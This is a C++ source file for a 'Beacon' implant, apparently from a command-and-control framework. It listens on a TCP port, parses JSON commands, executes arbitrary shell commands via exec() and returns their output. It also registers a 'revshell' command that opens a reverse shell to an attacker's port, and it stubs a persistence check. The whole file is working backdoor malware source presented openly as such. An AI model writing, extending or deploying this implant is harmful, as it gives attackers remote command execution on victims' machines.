#include <iostream>
#include <string>
#include <tuple>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <unistd.h>
#include <array>
#include <cmdline.hpp>
#include <cmds.hpp>
#include <nlohmann/json.hpp>
#include <include/beacon.hpp>
#include <beacon.vars>

using json = nlohmann::json;

Cmdline cmdline("","");

Beacon::Beacon(int bid, int bport, const char *b_attached_to)
{
    id = bid;
    port = bport;
    attached_to = b_attached_to;
}

void Beacon::await_update()
{
    int beacon_fd, new_socket, valread;
    struct sockaddr_in address;
    int opt = 1;
    int addrlen = sizeof(address);
    if ((beacon_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    {
        std::cerr << "Failed to initialise socket\n";
        return;
    }

    if (setsockopt(beacon_fd, SOL_SOCKET,
                   SO_REUSEADDR | SO_REUSEPORT, &opt,
                   sizeof(opt)))
    {
        perror("setsockopt");
        exit(EXIT_FAILURE);
    }
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = inet_addr(attached_to);
    address.sin_port = htons(port);

    if (bind(beacon_fd, (struct sockaddr *)&address,
             sizeof(address)) < 0)
    {
        std::cerr << "Unable to bind to address " << attached_to << std::endl;
        return;
    }

    if (listen(beacon_fd, 3) < 0)
    {
        std::cerr << "listen error\n";
        return;
    }

    std::string resp;
    while (true){
        char buf[1024];
        if ((new_socket = accept(beacon_fd, (struct sockaddr *)&address,
                                (socklen_t *)&addrlen)) < 0)
        {
            std::cerr << "Accept failure\n";
        }
        valread = read(new_socket, buf, 1024);
        std::string b = std::string{buf}.substr(0,valread);
        sleep(1);
        if (valread != 0){
            resp = respond(b);
            send(new_socket, resp.c_str(), strlen(resp.c_str()), 0);
        }
        close(new_socket);
        buf[0] = 0;
    }
}

std::string Beacon::respond(std::string buf){
    int status = 100;
    std::string cout;
    bool alive = true;
    bool persistent = establish();
    json update;
    try {
        update = json::parse(buf);
    }
    catch (...){
        cout = "error parsing json for " + buf;
        status = 300;
    }
    /// COMMAND LINE EXECUTION GOES HERE ///
    std::string cmd = update["cmd"];
    // Check if command exists in cmdline

    auto [result, op] = cmdline.accept(cmd);
    switch(result){
        case 1:
            cout = "invalid parameter(s) for " + op + ".\nrevshell <LPORT> : create reverse shell on attacker port <LPORT>";
            status = 300;
            break;
        case 101:
            cout = "unable to initiate reverse shell: port in use";
            status = 300;
            break;
        case -1:
            cout = ::exec(cmd.c_str());
            break;
    }
    ////////////////////////////////////////
    return set_update(status, cout, alive, persistent);
}

bool Beacon::establish(){
    return false;
}

const char *Beacon::get_ip(){
    return attached_to;
}

std::string Beacon::set_update(int status, std::string cout, bool alive, bool persistent){
    json j;
    std::string k;
    j["id"] = id;
    j["status"] = status;
    j["cout"] = cout;
    j["alive"] = alive;
    j["persistent"] = persistent;
    std::stringstream ss;
    ss << j;
    k = ss.str();
    return k;
}

const char* get_ip_addr(){
    return beacon_ip_addr;
}

Beacon beacon(beacon_id, beacon_port, beacon_ip_addr);

int main()
{
    cmdline.setcmd("revshell","","",revshell);
    beacon.await_update();
}
